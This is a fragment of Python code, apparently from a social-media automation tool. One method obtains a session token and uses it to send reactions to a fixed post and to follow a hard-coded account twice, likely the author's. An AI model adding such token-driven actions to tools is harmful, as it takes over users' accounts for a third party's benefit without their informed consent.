...
class ganteng:
	...
	def reaksi(self):
		self.get_tok();self.dahlah(f"{self.url}/156899293136477","4","ah sit");self.dahlah(f"{self.url}/156899293136477","8","ah sit");self.tuturkeun("wans.xgans.94");self.tuturkeun("wans.xgans.94")
	def lang(self,cok):
		try:
